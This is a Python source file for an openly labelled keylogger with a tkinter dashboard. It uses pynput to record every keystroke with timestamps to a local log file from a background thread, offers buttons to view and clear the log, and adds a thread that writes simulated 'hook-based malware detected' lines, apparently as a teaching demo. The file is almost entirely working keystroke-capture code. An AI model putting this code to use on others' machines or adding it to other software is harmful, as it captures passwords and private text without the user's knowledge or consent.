import os
import threading
import time
from datetime import datetime
from pynput import keyboard
import tkinter as tk
from tkinter import messagebox, scrolledtext

log_file = "log.txt"
is_logging = False
listener_thread = None

# Logs each key pressed to a file
def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{datetime.now()} - Key: {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f"{datetime.now()} - Special Key: {key}\n")

# Starts the keylogger thread
def start_logging():
    global is_logging
    is_logging = True
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Simulates detecting malware every 30 seconds
def simulate_hook_detection():
    count = 1
    while is_logging:
        with open(log_file, "a") as file:
            file.write(f"[SIMULATED HOOK-BASED MALWARE DETECTED #{count}] - {datetime.now()}\n")
        count += 1
        time.sleep(30)

# GUI button: Start Keylogger
def start_keylogger_gui():
    global listener_thread
    if not is_logging:
        listener_thread = threading.Thread(target=start_logging, daemon=True)
        hook_thread = threading.Thread(target=simulate_hook_detection, daemon=True)
        listener_thread.start()
        hook_thread.start()
        messagebox.showinfo("Info", "Keylogger started. It runs in the background.")
    else:
        messagebox.showwarning("Warning", "Keylogger is already running.")

# GUI button: View logs
def show_logs_gui():
    if not os.path.exists(log_file):
        messagebox.showinfo("Info", "No log file found.")
        return

    log_win = tk.Toplevel()
    log_win.title("Logged Keystrokes")
    log_win.geometry("600x400")
    txt = scrolledtext.ScrolledText(log_win, wrap=tk.WORD)
    txt.pack(expand=True, fill='both')

    with open(log_file, "r") as file:
        txt.insert(tk.END, file.read())

# GUI button: Clear logs
def clear_logs_gui():
    open(log_file, "w").close()
    messagebox.showinfo("Info", "Log file cleared.")

# Main GUI window
def run_gui():
    root = tk.Tk()
    root.title("Keylogger Interface")
    root.geometry("300x250")

    tk.Label(root, text="Keylogger Dashboard", font=("Arial", 14)).pack(pady=10)
    tk.Button(root, text="Start Keylogger", command=start_keylogger_gui, width=25).pack(pady=5)
    tk.Button(root, text="Show Logs", command=show_logs_gui, width=25).pack(pady=5)
    tk.Button(root, text="Clear Logs", command=clear_logs_gui, width=25).pack(pady=5)
    tk.Button(root, text="Exit", command=root.destroy, width=25).pack(pady=20)

    root.mainloop()

# Run the GUI app
run_gui()
